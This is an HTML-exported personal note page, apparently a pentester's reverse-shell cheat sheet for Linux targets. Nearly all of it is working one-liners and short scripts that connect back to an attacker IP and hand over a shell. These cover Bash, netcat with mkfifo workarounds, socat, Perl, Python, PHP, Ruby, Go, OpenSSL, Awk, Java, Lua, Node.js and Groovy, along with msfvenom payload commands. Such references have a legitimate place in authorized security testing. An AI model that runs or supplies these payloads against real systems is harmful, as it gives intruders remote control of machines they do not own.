<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Linux</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><strong><h1># Shells - Linux</h1></strong><br /><br /><strong>Links</strong><br />• <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md</a><br />• <a href="https://www.phillips321.co.uk/2012/02/05/reverse-shell-cheat-sheet/">https://www.phillips321.co.uk/2012/02/05/reverse-shell-cheat-sheet/</a><br />• <a href="http://pe">http://pe</a><a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">ntestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a><br />• <a href="https://xapax.gitbooks.io/security/content/reverse-shell.html">https://xapax.gitbooks.io/security/content/reverse-shell.html</a><br /><br /><strong><h2>## Tips</h2></strong><br />• Try finding out what binaries are available on the system to see what reverse shells you can run<br />   ◇ <code>ls -l /usr/bin/</code><br />• On FreeBSD?<br />   ◇ if <code>nc -e</code> is disabled - use <code>mkfifo</code> version<br />   ◇ Try <code>telnet</code><br /><br /><strong><h2>## Go-to&#39;s (in order)</h2></strong><br />Bash<br /><code>bash -i &gt;&amp; /dev/tcp/10.0.0.1/443 0&gt;&amp;1</code><br /><br />Netcat<br /><code>nc 10.10.14.12 443 -e /bin/sh</code><br /><br />Netcat -e bypass<br /><code>mkfifo /tmp/f ; nc 192.168.1.183 443 &lt; /tmp/f | /bin/sh &gt; /tmp/f 2&gt; /tmp/f ; rm /tmp/f</code><br /><br />Telnet<br /><code>rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | telnet 10.11.0.42 443 &gt; /tmp/f</code><br /><br />Telnet pipe<br /><code>telnet 10.11.0.42 443 | /bin/sh | telnet 10.11.0.42 443</code><br /><br /><strong><h2>## Bash TCP</h2></strong><br /><code>bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1</code><br />URL encoded alternative<br /><code>0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/10.0.0.1/8080; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</code><br /><br /><strong><h2>## Bash UDP</h2></strong><br />Listener:<br /><code>nc -u -lvnp 9001</code><br />Target:<br /><code>bash -i &gt;&amp; /dev/udp/10.0.0.1/9001 0&gt;&amp;1</code><br /><br /><strong><h2>## Netcat</h2></strong><br />Listener:<br /><code>nc -lvnp 9001</code><br /><br /><code>nc 10.10.14.12 9001 -e /bin/sh</code><br /><code>nc -c bash 10.0.0.1 9001</code><br /><code>nc.traditional 10.0.0.1 4444 -e /bin/bash</code><br /><br /><strong>-e Disabled</strong><br />• On modern systems, <code>-e</code> is often disabled with netcat<br />• FreeBSD / OpenBSD always disables -e<br />• To get around this, use a piped netcat shell<br /><br /><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 9001 &gt;/tmp/f</code><br /><code>mkfifo /tmp/f ; nc 192.168.1.183 9001 &lt; /tmp/f | /bin/sh &gt; /tmp/f 2&gt; /tmp/f ; rm /tmp/f</code><br /><br /><em>Explanation of Above:</em><br /><code>mkfifo /tmp/f;</code> creates a named pipe<br /><code>nc 192.168.1.183 9001 &lt; /tmp/f</code> connects to our attacking machine and takes input from whatever is in /tmp/f<br /><code>| /bin/sh</code> pipes the result of <code>nc 192.168.1.183 9001 &lt; /tmp/f</code> to <code>/bin/sh</code><br /><code>&gt; /tmp/f</code> which directs the output to /tmp/f<br /><code>2&gt; /tmp/f</code> and directs any errors to /tmp/f too (e.g. if you type a cmd which doesn&#39;t exist, it will tell you)<br /><code>; rm /tmp/f</code> once we exit the shell, the named pipe we made will be deleted<br /><br /><strong><h2>## Ncat</h2></strong><br />Ncat is the encrypted version of Netcat.<br />TCP:<br /><code>ncat 127.0.0.1 4444 -e /bin/bash</code><br />UDP:<br /><code>ncat --udp 127.0.0.1 4444 -e /bin/bash</code><br /><br /><strong><h2>## socat</h2></strong><br />Listener:<br /><code>socat file:`tty`,raw,echo=0 TCP-L:4242</code><br />Target:<br /><code>./socat exec:&#39;bash -li&#39;,pty,stderr,setsid,sigint,sane tcp:10.10.10.10:4242</code><br /><br /><strong><h2>## Perl</h2></strong><br /><code>perl -e &#39;use Socket;$i=&quot;10.10.10.12&quot;;$p=9001;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};&#39;</code><br /><br /><code>perl -MIO -e &#39;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;10.10.10.12:9001&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#39;</code><br /><br /><strong><h2>## Python</h2></strong><br /><strong>IPv4</strong><br />Short:<br /><a href="https://twitter.com/epi052/status/1177345422572044289">https://twitter.com/epi052/status/1177345422572044289</a><br /><code>python -c &quot;import pty,socket;h,p=&#39;10.11.0.42&#39;,9001;socket.create_connection((h,p));pty.spawn(&#39;/bin/sh&#39;);&quot;</code><br /><br />Uses environment variables:<br /><code>export RHOST=&quot;10.10.10.10&quot;;export RPORT=9001;python -c &#39;import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(&quot;RHOST&quot;),int(os.getenv(&quot;RPORT&quot;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&quot;/bin/bash&quot;)&#39;</code><br /><br />No environement variables:<br /><code>python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.10.10&quot;,9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</code><br /><br />Script:<br /><div class="codebox"><div class="codebox">import&nbsp;os,&nbsp;socket,&nbsp;subprocess<br /><br />s&nbsp;=&nbsp;socket.socket(socket.AF_INET,&nbsp;socket.SOCK_STREAM)<br />s.connect((&#39;10.10.14.6&#39;,&nbsp;9003))<br /><br />os.dup2(s.fileno(),0)<br />os.dup2(s.fileno(),1)<br />os.dup2(s.fileno(),2)<br /><br />p&nbsp;=&nbsp;subprocess.call([&#39;/bin/bash&#39;,&nbsp;‘-i’])</div></div><br /><br /><strong>IPv6</strong><br /><code>python -c &#39;import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect((&quot;dead:beef:2::125c&quot;,9001,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn(&quot;/bin/sh&quot;);&#39; </code><br /><br /><strong><h2>## PHP</h2></strong><br /><code>php -r &#39;$sock=fsockopen(&quot;10.0.0.1&quot;,9001);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</code><br /><br /><strong>Tiny PHP reverse shell</strong><br /><a href="https://gist.github.com/rshipp/eee36684db07d234c1cc">https://gist.github.com/rshipp/eee36684db07d234c1cc</a><br /><code>&lt;?php exec(&quot;/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.0.0.10/1234 0&gt;&amp;1&#39;&quot;); ?&gt;</code><br /><br />Or if <code>&#39;</code> inside of <code>&quot;</code> are causing issues - replace the <code>&#39;</code> with <code>&quot;</code> and escape the internal ones<br /><code>&lt;?php exec(&quot;/bin/bash -c \&quot;bash -i &gt;&amp; /dev/tcp/10.0.0.10/1234 0&gt;&amp;1\&quot;&quot;); ?&gt;</code><br /><br /><strong><h2>## Ruby</h2></strong><br /><code>ruby -rsocket -e&#39;f=TCPSocket.open(&quot;10.0.0.1&quot;,9001).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#39;</code><br /><br /><code>ruby -rsocket -e &#39;exit if fork;c=TCPSocket.new(&quot;10.10.0.14&quot;,&quot;9001&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;){|io|c.print io.read}end&#39;</code><br /><br /><strong><h2>## Golang</h2></strong><br />Writes a reverse shell into a file, executes, and then removes it<br /><code>echo &#39;package main;import&quot;os/exec&quot;;import&quot;net&quot;;func main(){c,_:=net.Dial(&quot;tcp&quot;,&quot;192.168.0.134:8080&quot;);cmd:=exec.Command(&quot;/bin/sh&quot;);cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}&#39; &gt; /tmp/t.go &amp;&amp; go run /tmp/t.go &amp;&amp; rm /tmp/t.go</code><br /><br /><strong><h2>## OpenSSL</h2></strong><br />Attacker:<br />1. Generate key pair<br /><code>openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes</code><br />2. Start listening server<br /><code>openssl s_server -quiet -key key.pem -cert cert.pem -port 4242</code><br />or<br /><code>ncat --ssl -vv -l -p 4242</code><br /><br />Target:<br />1. Connect to listener<br /><code>mkfifo /tmp/s; /bin/sh -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect 127.0.0.1:4242 &gt; /tmp/s; rm /tmp/s</code><br /><br /><strong><h2>## Awk</h2></strong><br /><code>awk &#39;BEGIN {s = &quot;/inet/tcp/0/10.0.0.1/4242&quot;; while(42) { do{ printf &quot;shell&gt;&quot; |&amp; s; s |&amp; getline c; if(c){ while ((c |&amp; getline) &gt; 0) print $0 |&amp; s; close(c); } } while(c != &quot;exit&quot;) close(s); }}&#39; /dev/null</code><br /><br /><strong><h2>## Java</h2></strong><br /><code>r = Runtime.getRuntime()</code><br /><code>p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/10.0.0.1/4242;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])</code><br /><code>p.waitFor()</code><br /><br /><strong><h2>## Java .war</h2></strong><br /><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f war &gt; reverse.war</code><br /><br /><strong><h2>## Lua</h2></strong><br /><code>lua -e &quot;require(&#39;socket&#39;);require(&#39;os&#39;);t=socket.tcp();t:connect(&#39;10.0.0.1&#39;,&#39;4242&#39;);os.execute(&#39;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#39;);&quot;</code><br /><br /><code>lua5.1 -e &#39;local host, port = &quot;10.0.0.1&quot;, 4444 local socket = require(&quot;socket&quot;) local tcp = socket.tcp() local io = require(&quot;io&quot;) tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, &quot;r&quot;) local s = f:read(&quot;*a&quot;) f:close() tcp:send(s) if status == &quot;closed&quot; then break end end tcp:close()&#39;</code><br /><br /><strong><h2>## NodeJS</h2></strong><br /><div class="codebox"><div class="codebox">(function(){<br />&nbsp;&nbsp;&nbsp;&nbsp;var&nbsp;net&nbsp;=&nbsp;require(&quot;net&quot;),<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cp&nbsp;=&nbsp;require(&quot;child_process&quot;),<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sh&nbsp;=&nbsp;cp.spawn(&quot;/bin/sh&quot;,&nbsp;[]);<br />&nbsp;&nbsp;&nbsp;&nbsp;var&nbsp;client&nbsp;=&nbsp;new&nbsp;net.Socket();<br />&nbsp;&nbsp;&nbsp;&nbsp;client.connect(4242,&nbsp;&quot;10.0.0.1&quot;,&nbsp;function(){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;client.pipe(sh.stdin);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sh.stdout.pipe(client);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sh.stderr.pipe(client);<br />&nbsp;&nbsp;&nbsp;&nbsp;});<br />&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;/a/;&nbsp;//&nbsp;Prevents&nbsp;the&nbsp;Node.js&nbsp;application&nbsp;form&nbsp;crashing<br />})();</div></div><br /><br /><code>require(&#39;child_process&#39;).exec(&#39;nc -e /bin/sh 10.0.0.1 4242&#39;)</code><br /><br /><code>-var x = global.process.mainModule.require<br />-x(&#39;child_process&#39;).exec(&#39;nc 10.0.0.1 4242 -e /bin/bash&#39;)</code><br /><br /><a href="https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py">https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py</a><br /><br /><strong><h2>## Groovy Script</h2></strong><br />NOTE: Java reverse shell also work for Groovy<br /><br />by <a href="https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76">frohoff</a> <br /><div class="codebox"><div class="codebox">String&nbsp;host=&quot;10.10.14.12&quot;;<br />int&nbsp;port=8044;<br />String&nbsp;cmd=&quot;cmd.exe&quot;;<br />Process&nbsp;p=new&nbsp;ProcessBuilder(cmd).redirectErrorStream(true).start();Socket&nbsp;s=new&nbsp;Socket(host,port);InputStream&nbsp;pi=p.getInputStream(),pe=p.getErrorStream(),&nbsp;si=s.getInputStream();OutputStream&nbsp;po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()&gt;0)so.write(pi.read());while(pe.available()&gt;0)so.write(pe.read());while(si.available()&gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try&nbsp;{p.exitValue();break;}catch&nbsp;(Exception&nbsp;e){}};p.destroy();s.close();</div></div><br /><br /><strong><h2>## Meterpreter Shell</h2></strong><br />Linux Staged reverse TCP<br /><code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.10.110 LPORT=4242 -f elf &gt;reverse.elf</code><br /><br />Linux Stageless reverse TCP<br /><code>msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.10.110 LPORT=4242 -f elf &gt;reverse.elf</code><br /><br /><strong><h2>## Telnet</h2></strong><br />mkfifo<br /><code>rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | telnet 10.11.0.42 9001 &gt; /tmp/f</code><br /><br />mknod<br /><code>rm /tmp/x; mknod /tmp/x p &amp;&amp; telnet 10.11.0.42 9001 0&lt;/tmp/x | /bin/bash 1&gt;/tmp/x</code><br /><br />telnet pipe - listen on both ports on attacking machine<br /><code>telnet 10.11.0.42 9001 | /bin/sh | telnet 10.11.0.42 9002</code></div>
</body>
</html>
